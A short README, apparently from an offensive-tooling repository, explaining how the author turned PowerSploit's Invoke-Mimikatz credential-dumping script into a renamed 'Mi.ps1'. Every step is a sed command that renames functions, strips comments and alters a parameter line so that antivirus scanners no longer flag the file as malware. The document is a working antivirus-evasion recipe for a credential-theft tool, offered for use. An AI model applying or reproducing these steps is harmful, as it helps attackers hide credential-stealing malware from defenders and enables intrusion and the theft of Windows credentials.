# Mimikatz

Mi.ps1 is a modified version of Mimikatz which is available at https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1

I downloaded the file an modified it with the following commands:

sed -i -e 's/Invoke-Mimikatz/Invoke-Mimidogz/g' Invoke-Mimikatz.ps1
sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1
sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1
sed -i -e 's/DumpCreds/DumpCred/g' Invoke-Mimikatz.ps1
sed -i -e 's/ArgumentPtr/BirdIsTheWord/g' Invoke-Mimikatz.ps1
sed -i -e 's/CallDllMainSC1/UnceUnceUnce/g' Invoke-Mimikatz.ps1
sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Mimikatz.ps1

At the end I renamed the file with

mv Invoke-Mimikatz.ps1 Mi.ps1

This will change the bahivor of most AV scanners. The file will be no longer detected as maleware, but the execution will be still blocked when the code sucked in.
